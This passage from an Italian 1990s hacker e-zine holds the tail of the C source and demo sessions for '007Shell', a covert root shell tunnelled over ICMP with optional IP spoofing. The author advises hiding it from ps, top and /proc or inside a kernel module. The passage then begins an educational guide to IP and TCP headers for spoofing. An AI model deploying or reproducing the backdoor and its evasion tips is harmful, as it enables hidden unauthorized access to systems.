    bcopy(hostEnt->h_addr,(char *)&addr.s_addr,hostEnt->h_length);
  }
  return addr.s_addr;
}
	
char *hostLookup(u_long in)
{
  char hostname[1024];
  struct in_addr addr;
  struct hostent *hostEnt;


  bzero(&hostname,sizeof(hostname));
  addr.s_addr = in;
  hostEnt = gethostbyaddr((char *)&addr, sizeof(struct in_addr),AF_INET);

  if(!hostEnt)
    strcpy(hostname,inet_ntoa(addr));
  else
    strcpy(hostname,hostEnt->h_name);

  return(strdup(hostname));
}

u_short in_chksum(u_short *ptr, int nbytes)
{
  register long           sum;            /* assumes long == 32 bits */
  u_short                 oddbyte;
  register u_short        answer;         /* assumes u_short == 16 bits */

  /*
   * Our algorithm is simple, using a 32-bit accumulator (sum),
   * we add sequential 16-bit words to it, and at the end, fold back
   * all the carry bits from the top 16 bits into the lower 16 bits.
   */

  sum = 0;
  while (nbytes > 1)
  {
    sum += *ptr++;
    nbytes -= 2;
  }

	/* mop up an odd byte, if necessary */
  if (nbytes == 1)
  {
    oddbyte = 0;            /* make sure top half is zero */
    *((u_char *) &oddbyte) = *(u_char *)ptr;   /* one byte only */
    sum += oddbyte;
  }

  /*
   * Add back carry outs from top 16 bits to low 16 bits.
   */

  sum  = (sum >> 16) + (sum & 0xffff);    /* add high-16 to low-16 */
  sum += (sum >> 16);                     /* add carry */
  answer = ~sum;          /* ones-complement, then truncate to 16 bits */

  return((u_short) answer);
}

/************************************************************************
********************** Ed ora .... s_C_iotaim =;) ***********************
************************************************************************/
	
void ICMP_init(void)
{
	int spoof_opt = 1;

  if(icmp_init)
  {
    if (ip_spoof == NOPE) {
	if((sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)) < 0 ) {
      		fprintf(stderr, "Impossibile creare raw ICMP socket ");
      		exit(0);
    	}
    }
    if (ip_spoof == YEAH) {
	if((sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0 ) {
                fprintf(stderr, "Impossibile creare raw socket ");
                exit(0);
	}
	if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &spoof_opt,
		sizeof(spoof_opt)) < 0 ) {
		fprintf(stderr,"Impossibile creare IP Header ");
		exit(0);
	}
    }
    icmp_init = 0;
  }
}

void ICMP_reset(void)
{
  close(sockfd);
  icmp_init = 1;
}

int ICMP_send
(char *send_mesg, size_t mesglen, u_long dest_ip, int echo, int last)
{
  int                   sparato;
  struct tunnel {
        struct icmp     icmp;
        u_char          data[MAXMESG];
  } icmp_pk;
  int                   icmplen = sizeof(struct icmp);
  int                   pach_dim;
  struct sockaddr_in    dest;
  int                   destlen;

  if(mesglen > MAXMESG)
    return(-1);
    
  if(icmp_init)        
    ICMP_init();

  destlen = sizeof(dest);
  bzero((char *) &dest, destlen);
  dest.sin_family       = AF_INET;
  dest.sin_addr.s_addr  = dest_ip;

  pach_dim = mesglen + sizeof(struct icmp);
  memset(&icmp_pk, 0, pach_dim);
  icmp_pk.icmp.icmp_type = ICMP_ECHOREPLY;
  bcopy(send_mesg, icmp_pk.icmp.icmp_data, mesglen);
  icmp_pk.icmp.icmp_cksum = in_chksum((u_short *) &icmp_pk.icmp, 
				(sizeof(struct icmp)+mesglen));
  if(echo) icmp_pk.icmp.icmp_seq = ECHO_TAG;
  if(last) icmp_pk.icmp.icmp_seq = ECHO_LAST;

  if( (sparato = sendto(sockfd, &icmp_pk, pach_dim, 0, (struct sockaddr *)
	&dest, destlen)) < 0 ) {
    		perror("RAW ICMP SendTo: ");
		return(-1);
  }
  else if(sparato != pach_dim) {
	perror("Dimensioni pacchetto IP errate: ");
    	return(-1);
  }
  return(sparato);
}

int ICMP_sp_send(char *send_mesg, size_t mesglen, u_long dest_ip, u_long sp_ip)
{
  int                   sparato;
  struct spoof {
  	struct ip	ip;
  	struct icmp  	icmp;
	u_char          data[MAXMESG];
  } sp_pk;
  int 			iplen = sizeof(struct ip);
  int			icmplen = sizeof(struct icmp);
  int                   pach_dim;
  struct sockaddr_in    dest;
  int                   destlen;

  if(mesglen > MAXMESG)
    return(-1);

  if(icmp_init)
    ICMP_init();

  destlen = sizeof(dest);
  bzero((char *) &dest, destlen);
  dest.sin_family       = AF_INET;
  dest.sin_addr.s_addr  = dest_ip;

  pach_dim = mesglen + sizeof(struct ip) + sizeof(struct icmp);
  memset(&sp_pk, 0, pach_dim); 

  sp_pk.ip.ip_v = 4;
  sp_pk.ip.ip_hl = 5;
  sp_pk.ip.ip_len = htons(iplen + icmplen + mesglen);
  sp_pk.ip.ip_ttl = 255;
  sp_pk.ip.ip_p = IPPROTO_ICMP;
  sp_pk.ip.ip_src.s_addr = sp_ip;
  sp_pk.ip.ip_dst.s_addr = dest_ip;

  sp_pk.icmp.icmp_type = ICMP_ECHOREPLY;
  bcopy(send_mesg, sp_pk.icmp.icmp_data, mesglen);
  sp_pk.icmp.icmp_cksum = in_chksum((u_short *) &sp_pk.icmp,
				(sizeof(struct icmp)+mesglen));  

  if((sparato = sendto(sockfd, &sp_pk, pach_dim, 0, (struct sockaddr *)
		&dest, destlen)) < 0 ) {
        perror("RAW ICMP SendTo: ");
        return(-1);
  }
  if(sparato != pach_dim) {
        perror("Dimensioni pacchetto IP errate: ");
        return(-1);
  }
  return(sparato);
}

int ICMP_recv(char *recv_mesg, size_t mesglen, int echo)
{
  struct recv {
	struct ip  	ip;
	struct icmp	icmp;
	char		data[MAXMESG];
  } rcv_pk;
  int	pach_dim;	      
  int	accolto;
  int   iphdrlen;
  int   clilen = sizeof(clisrc);
  
  if(icmp_init)        
    ICMP_init();
  
  while(1)
  {
    pach_dim = mesglen + sizeof(struct ip) + sizeof(struct icmp);
    memset(&rcv_pk, 0, pach_dim);
    if( (accolto = recvfrom(sockfd, &rcv_pk, pach_dim, 0, (struct
	sockaddr *) &clisrc, &clilen)) < 0 )
      continue;
    
    iphdrlen = rcv_pk.ip.ip_hl << 2;    
    if(accolto < (iphdrlen + ICMP_MINLEN))
      continue;
    accolto -= iphdrlen;

   if(!echo){
    if(!rcv_pk.icmp.icmp_id && !rcv_pk.icmp.icmp_code &&
	rcv_pk.icmp.icmp_type == ICMP_ECHOREPLY && rcv_pk.icmp.icmp_seq !=
	ECHO_TAG && rcv_pk.icmp.icmp_seq != ECHO_LAST)
      break;
   }
   if(echo){
    if(!rcv_pk.icmp.icmp_id && !rcv_pk.icmp.icmp_code &&
	rcv_pk.icmp.icmp_type == ICMP_ECHOREPLY
        && (rcv_pk.icmp.icmp_seq == ECHO_TAG || rcv_pk.icmp.icmp_seq ==
	ECHO_LAST) )
      break;
   }
  }
     if(!echo){
  	accolto -= ICMP_HDR;
  	bcopy(rcv_pk.icmp.icmp_data, recv_mesg, accolto);
  	return(accolto);
     }
     if(echo){
  	if(rcv_pk.icmp.icmp_seq == ECHO_TAG) {
        	accolto -= ICMP_HDR;
        	bzero(recv_mesg, sizeof(recv_mesg));
        	bcopy(rcv_pk.icmp.icmp_data, recv_mesg, accolto);
        	return(accolto);
  	}
        return(-666);
     }
}


--------------------------- taglia qui -----------------------------------

Sinceramente quello che c'e' da sapere senza studiarsi il codice e' gia'
contenuto nella testa della lib stessa. Per il resto, tirate fuori quei
manuali di C e programmazione socket e leggetevi tutto il sorgente.
in_chksum e' la solita funzione presente ad esempio in ping e traceroute.

u_long  nameResolve(char *hostname);
char    *hostLookup(u_long in);

Queste due invece sono semplici funzioni wrapper che fanno uso di
gethostbyname(3) e gethostbyaddr(3) e delle strutture di tipo hostent.
Sono pressocche' identiche in ogni programma di socket che si rispetti :)
Queste due non fanno eccezione. :p

Per quanto riguarda i socket in se, questi sono creati con:

sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP); 

e con (IP Spoofing):

sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &spoof_opt, sizeof(spoof_opt);

per poter creare anche l'header del datagramma IP (IP_HDRINCL).

############################################################################
NOTA:	questo NON e' l'IP Spoofing di cui tanto avete sentito parlare. O
	meglio, lo e'. Ma solo in termini di coding. Spesso con Spoofing si
	intende l'impersonificazione di host fidati oppure il redirecting o
	l' hijack di connessioni in corso. Sebbene questo sia errato, e'
	ormai entrato nell'uso comune. In questo codice avete cmq tutto
	quanto vi serve per iniziare il vostro cammino nell'IP Spoofing.
	Ora manca solo il mumble mumble del vostro encefalo :)
	Oppure il mio prossimo articolo sulle varianti e tecniche di Spoof
############################################################################

Tanto per capirci, vediamo un pochino come si presenta il programma.
1) Prima cosa: creare raw socket richiede accesso da superutente. Quindi
lanciatelo da root o come root; o setuid root; o da un cron. O come cavolo
volete purche' abbia i privilegi richiesti.

[fusys@BFI fusys]$ uname -a
Linux BFI 2.0.34 #2 Sat Jun 27 16:26:10 CEST 1998 i586 unknown
[fusys@BFI fusys]$ id
uid=501(fusys) gid=501(fusys) groups=501(fusys),100(users)
[fusys@BFI fusys]$ 007Shell -s
007Shell v.1.0 - Let's Go Covert !
[fusys@BFI fusys]$ Impossibile creare raw ICMP socket
[fusys@BFI fusys]$

2) Lanciatelo in modo server con 007Shell -s. Sta a voi patcharvi contro
/proc per evitare ps e top ....

[root@BFI /root]# 007Shell -s
007Shell v.1.0 - Let's Go Covert !
[root@BFI /root]# ps ax |grep 007
  331  ?  S    0:00 007Shell v.1.0 - Good Luck James ...
[root@BFI /root]#

3) Per il vostro sistema invece con 007Shell -c -h host_remoto

[root@BFI /root]# 007Shell -c -h BFI
007Shell v.1.0 - Let's Dig Covert !
[covert@007Shell]# pwd
/tmp
[covert@007Shell]# id
uid=0(root) gid=0(root) groups=0(root), 1(bin), 2(daemon), 3(sys), 4(adm), 
6(disk), 10(wheel)
[covert@007Shell]# snafuz!
See ya Covert, James ...
[root@BFI /root]#

4) Per spoofare il vostro IP -S ip_spoof

[root@BFI /root]# 007Shell -c -h BFI -S 99.99.99.99
007Shell v.1.0 - Let's Dig Covert !
[covert@007Shell]# touch COLPITO!
[covert@007Shell]# snafuz!
See ya Covert, James ...
[root@BFI /root]# ls /tmp/
COLPITO!       install.log    tksysv-backup
[root@BFI /root]#

Vediamo come si presenta la rete con un bel log di tcpdump:

[root@BFI /root]# tcpdump -nvv
tcpdump: listening on lo
07:47:03.422904 127.0.0.1 > 127.0.0.1: icmp: echo reply (ttl 64, id 29)
07:47:03.422904 127.0.0.1 > 127.0.0.1: icmp: echo reply (ttl 64, id 29)
07:47:03.442904 127.0.0.1 > 127.0.0.1: icmp: echo reply (ttl 64, id 30)
07:47:03.442904 127.0.0.1 > 127.0.0.1: icmp: echo reply (ttl 64, id 30)

Se invece spoofiamo l'IP sorgente (in questo caso settato a 99.99.99.99):

07:47:51.522904 99.99.99.99 > 127.0.0.1: icmp: echo reply (ttl 255, id 39)
07:47:51.522904 99.99.99.99 > 127.0.0.1: icmp: echo reply (ttl 255, id 39)
07:47:55.362904 99.99.99.99 > 127.0.0.1: icmp: echo reply (ttl 255, id 40)
07:47:55.362904 99.99.99.99 > 127.0.0.1: icmp: echo reply (ttl 255, id 40)

Il cambiamento evidente e' pressocche' nullo :). In effetti il TTL viene
ormai settato da molti seguaci 4.4BSD a 255 invece che a 64. Certo e' che
molti comandi creeranno una tempesta di messaggi ICMP che potrebbe essere
scambiata, in un log paranoico, per un tentativo di DOS; o per uno scherzo
stupido.
I log soprastanti si riferiscono a pacchetti dalla/alla mia macchina. 

COSA VALUTARE ?! 

Beh, questa NON e' una connessione TCP. I pacchetti potrebbero perdersi o
arrivare in ordine sparso. Non e' colpa mia. E' solo che IP non fornisce
di meglio, senza il protocollo di controllo della trasmissione.
La tempesta ICMP potrebbe esser notata da router o firewall intelligenti.
Potrebbe esser scoperta, se abusata o non opportunamente nascosta nel
sistema. Quindi patchate il patchabile o inserite il tutto in un bel LKM o
magari addirittura come diff del kernel in ~net/ipv4 ...

Se avete 007Shell.tgz in esso troverete ICMPLIB_V1.h e linux_ip_icmp.h ,
altrimenti dovrete procurarveli ... il secondo nella distro di tcpdump per
linuzzo ed il primo probabilmente tra le varie release dei tool di BFI.
[Coming Soon ........]

Date un bel make e buon divertimento ! Prima accendete il cervello.

Casco in testa. E luci accese, sempre. Anche di giorno. :)

								FuSyS

Testi consigliati:

	W.R.Stevens	TCP/IP Illustrated Vol.1 & 2
	W.R.Stevens	Unix Network Programming 2ed. Vol.1


----------------------------[ PR0GETT0 0N0S3NDAi ]----------------------------
------------------[ GUiDA NEWBiE ALL'iP SP00FiNG - PARTE I ]------------------
---------------------[ tratto da: TCP/iP T00LS UNLiMiTED ]--------------------
----------------------------------[ FuSyS ]-----------------------------------

NO(C)1998 fusys
A scopo informativo e di apprendimento. Ricerca e conoscenza. E, perche' no ?!
Anche ludico. Nel numero 2 di BFI ho fatto assurgere a stato di slogan
questo semplice  'man brain'. Ora siamo al numero 4. Ora piu' che mai
bisogna installare i driver adatti allo scopo, dal momento che il solo BIOS 
di cui siam dotati di natura, non e' sempre sufficientemente attrezzato
allo scopo. Usatelo, il cervello.

#############################################################################
DISCLAIMER	
Tutto il materiale contenuto in questo articolo e' di pubblico dominio. Le
spiegazioni, le descrizioni, i consigli, il codice, sono rielaborazioni,
creazioni e sunti evinti da RFC, libri, FAQ e letture di molto codice.
NULLA E' TOTALMENTE NUOVO O RIVELAZIONE DI QUEL CH'ERA COPERTO DA SEGRETO
MILITARE. I vari ingredienti del progetto sono reperibili in rete. 
#############################################################################

Quindi non e' proprio il caso di scomporsi se questo documento viene dato
in pasto a chiunque. Mai sentito parlare di Bellovin, Morris, Joncheray,
PHRACK, BUGTRAQ ? Ognuna di queste fonti ha rivelato apertamente, senza
alcuna omissione, e secondo il loro specifico auditorio, ogni implicazione
relativa alla (in)sicurezza intrinseca del set di protocolli TCP/IP. Chi e' 
comunque in grado di capire l'avra' gia' fatto (se sa parlare inglese). Chi 
non lo e' dubito lo faccia oggi, pur con questo scritto in italiano. [A
meno che io sia davvero una chiavica con l'italiano =;) ]

Quindi si puo' dire questa sia colpa tua e della tua intro a BFI3, |scacco| !

------[ I N T R O  A D  0 N 0 S 3 N D A i ]------

Non provate neanche a dirmi che non sapete di che cosa io stia parlando.
Non conoscete davvero il CyberSpace VII ? Il deck prototipo che Armitage
fa avere a Case !!! Non vi ricordate neanche quanto costasse in crediti
rispetto agli altri deck nella trasposizione di Neuromancer ad opera della
InterPlay ? Ah, ecco ...
[se siete cosi' analfabeti o giovani da non ricordare, non abbiate paura e
scrivete pure a BFI. Vedremo di comporre qualche filastrocca ricca di
improperi tutta per voi !] 

OnoSendai, il deck del cowboy da consolle. W.G. l'ha vista cosi'. In fondo
e' uno scrittore. Ha reso romanticheggiante ed avventuroso agli occhi di
molti quel che fin'ora e' stato epico solo nelle nostre coscienze. Epico
si, ma anche decisamente astruso e complesso, come un ingranaggio occulto
che e' eccitante poter capire, descrivere, manipolare. [Non cosi'ricordano
i miei quando smontai i primi aggeggini casalinghi =;) ]
Nella mia concezione di smanettone, o meglio di newbie, ci sono sempre
stati argomenti mitici. Nel campo dell'hackeraggio in InterNet, sicuramente 
occupa un posto preminente l'iP SPOOFiNG. 

Sono piu' di dieci anni che alcuni attacchi, a partire dalle basi
concettuali, sono stati teorizzati tirando in ballo la possibilita' di
spacciarsi in rete per altri. 

Sono almeno due anni che si sente parlare di iP SPOOFiNG normalmente nelle
policy, nei libri di sicurezza, negli HowTo di scanner e firewall. Dal
1993 ad oggi alcuni rinomati attacchi si dice siano stati portati a
termine con l'iP SPOOFiNG.

E' almeno un anno che anche in Italia si assiste su larga scala all' invasione
su IRC, Usenet e web di << hacker italiani >> che decisamente ben poco hanno 
a che fare con l'hackeraggio, e che invece rappresentano solo la prima ondata 
di script kiddies dovuta all'esplosione di InterNet. Come di ogni script kid 
che si rispetti, quello cioe' che almeno sa cosa deve/dovrebbe fare tra uno 
script/code e l'altro, anche di questi si puo' esser sicuri che conoscano
l'iP SPOOFiNG. Almeno concettualmente. Certo, hanno visto tutti che nelle
opzioni di molti DOS, nuke, click, pip|pop|pap c'e' l'opzione di inserimento
dell'iP sorgente. "WoW, cosi' spoofo il mio iP !" si sente dire.

D'altronde, come sa chiunque usi bounce, redirect, bnc, ssh, pipes e compagnia
bella su IRC, ANCHE questo puo' essere considerato SPOOFiNG. Visto che non
si intende altro che lasciare il proprio IP sotto mentite spoglie.

Pero' non e' mai stato questo il significato originario del termine.
Effettivamente ha assunto subito tale definizione l'impersonificazione di
un altro host. Utile, nei primi attacchi teorizzati, all'utilizzo illegale
dei rapporti di relazione/fiducia tra sistemi differenti. Proprio come e'
stato appunto 'massificato' nell'articolo di Daemon9 apparso nel numero 48
di Phrack. In altri attacchi, lo SPOOFiNG ha colpito i DNS in modo da non
ricorrere alle tecniche di predizione del numero iniziale di sequenza per
alterare il routing dei dati. Ma sto correndo troppo ora ... :)

------[ O B I E T T I V O ]------

Questo progetto presenta 'alcuni' dei passi da me compiuti nell'ambito
dell'iP SPOOFiNG. Al solito, in una veste didattica =). Solo alcuni passi
pero', perche' sinceramente non mi sento di levare a lama e apprendisti 
newbie quello che ho provato io nel compiere tale strada: stupore per la
consapevolezza di poterlo fare da soli.

Se non avete molto tempo a disposizione tranquilli. Se dopo qualche
lettura avrete davvero capito, il vostro subconscio digerira' il tutto
presentandovi i risultati magari mesi dopo, quando affronterete codice e
TCP/IP per la prima volta.
Per i piu' grandicelli (nella scala dello smanettamento), questo potrebbe
essere un interessante spunto, se non un HOWTO.
Ricordo a tutti comunque, che ho adottato Linux come sistema operativo
*nix in cui testare i vari miei progetti. Potete regalarmi una SUN per
vedere qualcosa su Solaris.

PREREQUISITI		Conoscenza di base di Internet, TCP/IP, *nix e C
			Come sarebbe a dire che non ne avete ?! =;)

------[ P E R S O N A G G I  P R I N C I P A L I ]------

Beh, stiamo parlando di TCP/IP. Quindi indubbiamente entrano in gioco:

- IP 
- TCP

Certo e' possibile spoofare con UDP, ICMP, ARP ed altri. Ma la maggior
parte delle connessioni che sono passibili di attacco sono ovviamente
quelle TCP.

E parlando di SPOOFiNG dobbiamo presentare:

- sniffing ed implementazioni
- socket e manipolazioni

Il tutto e' accompagnato da sessioni di rete e simulazioni. Partiamo ora
da una analisi sommaria dei protocolli IP e TCP.

------[ I P  -  I n t e r n e t  P r o t o c o l ]------

Questo e' il protocollo principale del set TCP/IP. Abbastanza ovvio se
consideriamo che, senza IP, non avremmo neanche, per citare i piu'
conosciuti, UDP e TCP. Niente dati, sorry. Niente connessioni. Basta FTP.
Come ? World Wide Web ? No no. NIENTE INTERNET :)

Prima di tutto partiamo da quello che IP e' deputato a fornire: un
servizio 'inaffidabile' di distribuzione di datagrammi non orientato alla
connessione. 

Per 'inaffidabile' si intende che NON C'E' certezza che i pacchetti da noi
inviati arrivino alla destinazione. Il servizio e' offerto sulla base del
miglior impegno possibile, ma senza garanzie. Se poi qualcosa non funziona, 
il datagramma viene perso, e viene generato un messaggio di tipo ICMP
(vedi progetto NiNJA)verso la sorgente. Nel caso servisse un qualche tipo 
di controllo delle connessioni dovremo rifarci agli strati superiori del
set, ad esempio TCP.

Per 'non orientato alla connessione' si vuol dire che IP non mantiene
alcuna informazione di stato sui pacchetti trasmessi. Questi possono
arrivare o meno nell'ordine di partenza, e spesso e' necessario, nel caso
manchi un controllo negli strati superiori, codarlo direttamente a livello
delle applicazioni.

Un argomento importantissimo, nel campo dello SPOOFiNG e della gestione
dei raw socket, relativo ad IP e' sicuramente quello dell' header, la
testa del pacchetto che viene ricevuto/trasmesso. Vediamo in questo
diagramma l'aspetto tipico di un header IP, che ha dimensioni usuali di 20
byte (questo puo' variare nel caso si specifichino opzioni IP).

0				15 16				    31   /
----------------------------------------------------------------------   |
| 4-bit	| 4-bit	 |    8-bit TOS	  |	  16-bit total lenght	     |   |
|version|head.len| Type Of Service|	       (in bytes)	     |   |
----------------------------------------------------------------------   |
|	       16-bit		  | 3-bit|  	   13-bit	     |   |
|	   identification	  | flags|     fragment offset	     |   |
----------------------------------------------------------------------   |
|    8-bit TTL	 |	8-bit	  |		 16-bit		     |   20
|  time to live  |     protocol   |	    header checksum	     |  bytes
----------------------------------------------------------------------   |
|			32-bit source IP address		     |   |
----------------------------------------------------------------------   |
|		      32-bit destination IP address		     |   |
----------------------------------------------------------------------   \
/				options				     /
----------------------------------------------------------------------
\				 data				     \
----------------------------------------------------------------------

OK OK. Ho capito. 
"Perche' hai messo i nomi dei campi della testa del pacchetto IP in
inglese ?". Semplice. Questo articolo non arriva da un libro di
ingegneria. Qui parliamo di SPOOFiNG. Siccome non sono a conoscenza di
versioni tradotte in italiano dei vari file .h che servono per codare
strumenti di spoof, e' bene imparare subito quelli che sono i nomi
utilizzati nelle librerie. E cosi' facendo, leggendo BFI si impara un
pochino di inglese. Potrebbero adottarlo come testo facoltativo per il
colloquio di Inglese I nelle facolta' di informatica ! 

I numeri da 0 a 31 identificano i bit di cui e' composto ogni campo. In
totale il diagramma mostra 5 righe di 32 bit per un totale di 20 byte. Nel
caso di opzioni le dimensioni dell'header varieranno di conseguenza. Dopo
le opzioni (che possono essere 0) abbiamo i dati veri e propri, piu'
spesso incapsulati da un altro header, sia esso UDP, TCP, ICMP o chi per
esso.

Quindi all'inizio abbiamo una parola di 1 byte con i primi 4 bit che
identificano la versione, in questo caso 4, ed i secondi 4 bit che
mostrano le dimensioni dell'header come numero di parole a 32 bit. Dal
momento che solo 4 bit sono utilizzati a questo scopo il massimo valore
possibile per l'header e' di 60 byte.

Oggi come oggi poche implementazioni TCP/IP supportano il TOS, dal momento
che sono aumentate le risorse di rete e non e' piu' strettamente
necessario specificare 4 degli 8 bit di TOS a seconda dei servizi
richiesti ad IP. Se davvero ne volete sapere qualcosa guardatevi l'RFC 791.

Dopo abbiamo una parola di 16 bit che contiene la dimensione totale del
pacchetto IP trasmesso. E qui si impara qualcosa di pratico, dal momento
che si evince come con un valore di 16 bit la massima dimensione di un
pacchetto IP sia di 65535. Non vi ricorda niente questo valore ? Neanche
associato all'infame Ping of Death ? Forse e' ora di ricordare a memoria
le potenze di 2 fino all'8 e poi a 15, 16, 24 e 32 ... =;)
Questo campo varia nel caso di pacchetti frammentati.

Identification serve a distinguere il pacchetto dagli altri inviati dallo
stesso sistema. Dopo abbiamo 16 bit per 3 flags e l'offset necessari nel
caso della frammentazione del pacchetto. Per ora questo non ci e'
necessario, anche se l'idea di bypassare il packet filter di macchine NT
frammentando i pacchetti sia molto interessante.

Dopo abbiamo il TTL o time to live, che setta il numero massimo di router
o hop attraverso cui il pacchetto puo' passare. Quando raggiunge 0 il
datagramma viene scartato.

Dopo 1 byte ci serve per identificare il protocollo che IP sta
trasportando a destinazione. Questo valore cambia a seconda delle
applicazioni come potrete facilmente immaginare. Questi valori sono
necessari ad IP stesso per demultiplexare i pacchetti in arrivo. Essi sono
specificati in <linux/in.h> :

/* Standard well-defined IP protocols.  */
enum {
  IPPROTO_IP = 0,               /* Dummy protocol for TCP               */
  IPPROTO_ICMP = 1,             /* Internet Control Message Protocol    */
  IPPROTO_IGMP = 2,             /* Internet Group Management Protocol   */
  IPPROTO_IPIP = 4,             /* IPIP tunnels (older KA9Q tunnels use 94) */
  IPPROTO_TCP = 6,              /* Transmission Control Protocol        */
  IPPROTO_EGP = 8,              /* Exterior Gateway Protocol            */
  IPPROTO_PUP = 12,             /* PUP protocol                         */
  IPPROTO_UDP = 17,             /* User Datagram Protocol               */
  IPPROTO_IDP = 22,             /* XNS IDP protocol                     */
  IPPROTO_RAW = 255,            /* Raw IP packets                       */
  IPPROTO_MAX
};

Il Checksum viene calcolato solo sull'header di IP e non sui dati che
contiene. Questo vuol dire che tutti gli altri strati avranno il loro bel
checksum da calcolare per i loro dati. Se vogliamo creare pacchetti IP,
UDP, TCP e via a ruota, dovremo preoccuparci del checksum. Semplicemente
possiamo prelevare da altri sorgenti la funzione in_chksum :

u_short in_chksum(u_short *ptr, int nbytes)
{
  register long           sum;            /* assumes long == 32 bits */
  u_short                 oddbyte;
  register u_short        answer;         /* assumes u_short == 16 bits */

  /*
   * Our algorithm is simple, using a 32-bit accumulator (sum),
   * we add sequential 16-bit words to it, and at the end, fold back
   * all the carry bits from the top 16 bits into the lower 16 bits.
   */

  sum = 0;
  while (nbytes > 1)
  {
    sum += *ptr++;
    nbytes -= 2;
  } 
        /* mop up an odd byte, if necessary */
  if (nbytes == 1)
  {
    oddbyte = 0;            /* make sure top half is zero */
    *((u_char *) &oddbyte) = *(u_char *)ptr;   /* one byte only */
    sum += oddbyte;
  }

  /*
   * Add back carry outs from top 16 bits to low 16 bits.
   */

  sum  = (sum >> 16) + (sum & 0xffff);    /* add high-16 to low-16 */
  sum += (sum >> 16);                     /* add carry */
  answer = ~sum;          /* ones-complement, then truncate to 16 bits */

  return((u_short) answer);
}

Seguono a ruota due valori di 32 bit ciascuno: i famosi indirizzi IP di
sorgente e destinazione ! Proprio quelli che identificano ogni provenienza
di ogni pacchetto e che lasciano le vostre impronte per ogni dove. D'altra
parte sono anche quelli che vi permettono di indirizzare le vostre
richieste FTP sui server giusti; proprio non si puo' avere tutto dalla
vita, eh !? :P

"Allora bastera' cambiare questi ?" Vi sento gia' chiedere .... Beh, si e
no .... non sta tutto qui, altrimenti nessuno leggerebbe questo articolo.
Per ora comunque questo e' quello che ci serve sapere sull'interno di IP.
E' ora di dare un occhio a TCP.

------[ T C P  T r a n s m i s s i o n  C o n t r o l  P r o t o c o l ]-----

TCP e' decisamente la luce nel buio universo di una rete con milioni di
host differenti. Con TCP possiamo avere delle connessioni stabili con
server Telnet, IRC, FTP e persino con i server HTTP. Il fatto che ogni
tanto le connessioni cadano dipende dalla rete stessa, dalla sua
congestione, da errori negli applicativi di rete (e magari da attacchi
occulti ?!). Ma e' TCP che ci permette di trasferire i nostri file senza
problemi di sistema operativo o di errore. Se ci mettessimo nelle mani
del solo IP i nostri file sarebbero spesso corrotti anche solo per il
mancato rispetto dell'ordine di arrivo dei pacchetti. Senza parlare della
possibile perdita degli stessi. TCP mantiene il controllo di stato sulla
connessione; ricorda gli indirizzi degli host, le porte da cui stanno
parlando, il numero di pacchetti inviati e la loro correttezza ...
La specifica ufficiale e' contenuta nell' RFC 793.

Dobbiamo considerare che i dati TCP sono incapsulati in un datagramma IP:

    <--------------------- datagramma IP ----------------------->
             	    <--------------segmento TCP----------------->

    -------------------------------------------------------------
    |               |               |                           |
    |  IP Header    | TCP  Header   |      TCP Data             |
    |               |               |                           |
    -------------------------------------------------------------
        20 bytes	20 bytes
 

Ecco l'header TCP:

0                               15 16                               31   /
----------------------------------------------------------------------   |
|  16-bit source port number	  |   16-bit destination port number |   |
----------------------------------------------------------------------   |
|			32-bit sequence number			     |   |
----------------------------------------------------------------------   |
|		     32-bit acknowledgment number		     |   20
---------------------------------------------------------------------- bytes
| 4-bit  |  reserved  |U|A|P|R|S|F| 				     |   | 
| header | 	      |R|C|S|S|Y|I|	   16-bit window size	     |   |
| lenght |  (6-bits)  |G|K|H|T|N|N|				     |   |
----------------------------------------------------------------------   |
|	 16-bit checksum	  |	  16-bit urgent pointer	     |	 |    
----------------------------------------------------------------------   \
/				options				     /
----------------------------------------------------------------------
\				 data				     \
----------------------------------------------------------------------

Molto importanti sono vari campi. I due valori a 16 bit che identificano
le porte di origine e arrivo che servono a creare il socket

< host1 : port1 : host2 :port2 >

e identificano la connessione come univoca, permettendo a TCP di gestire
piu' connessioni per sistema oppure piu' client per lo stesso server.

Importantissimi nell'iP SPOOFiNG sono le due parole a 32 bit che seguono.
Sono il numero di sequenza ed il numero di riconoscimento, meglio
conosciuti come SEQ ed ACK.

Seguono 4 bit che mostrano le dimensioni massime dell'header TCP, 6 bit
riservati e poi le flag che identificano di volta in volta il
comportamento di TCP all'interno di una connessione. Ne riparliamo piu'
avanti.

Window specifica il numero di byte, a partire da quello mostrato
nell'ultimo ACK, che ogni lato e' disposto ad accettare.

Checksum viene calcolato con la stessa funzione presentata parlando di IP.

Il puntatore urgent e' valido solo se e' settata la flag URG. E' un offset
positivo che va aggiunto all'ultimo SEQ, per ottenere il SEQ dell'ultimo
byte che viene trasmesso in modalita' urgent.

Seguono le opzioni ed i dati.

TCP e' un protocollo orientato alla connessione. Prima che ognuno dei due
host possa inviare dati, va iniziata una connessione tra di essi. E' in
questo ambito che TCP svolge la maggior parte delle sue funzioni. Per
capire esattamente cosa succeda guardiamo una sessione di rete mediante
uno sniffer. [se non sapete cosa sia, vi consiglio di rileggervi
l'articolo Sniffing su BFI3]

Apro una connessione telnet verso l'host xxxxxx :

[fusys@BFI fusys]$ telnet xxxxxx
Trying 192.168.1.2...
Connected to xxxxxx.
Escape character is '^]'.

IBM AIX Version 4.0 for RISC System/6000
Special HACKiNG Release for XXXXXX
(C) Copyrights by IBM and by hackers 1982, 1998.
login:

vediamo cosa succede dietro alle quinte:

192.168.1.1:1025 > 192.168.1.2:23	SEQ:1118358509 ACK:0
(TTL:64 Window:512)			FLAGS: -S----

192.168.1.2:23 > 192.168.1.1:1025	SEQ:4143819233 ACK:1118358510
(TTL:64 Window:32736)			FLAGS: -S--A-

192.168.1.1:1025 > 192.168.1.2:23	SEQ:1118358510 ACK:4143819234
(TTL:64 Window:32120)			FLAGS: ----A-


Il client richiede la connessione al server telnet. Invia i dati dalla
porta TCP 1025 verso la porta 23 del server, che e' la porta di DEFAULT
per il telnet. Se volete sapere quali siano le altre porte standard date
un occhio al file /etc/services. [Se /etc non vuol dire nulla sul vostro
pc allora vuol dire che state usando Windows o Mac probabilmente. Se cosi'
e' non potrete testare in pratica molto teoria di quest'articolo]
Vediamo che il numero SEQ ha un certo valore. Essendo questo il primo
pacchetto della connessione questo SEQ e' il cosiddetto Initial Sequence
Number del client o ISN. L'ACK e' uguale a 0. Vediamo poi che delle varie
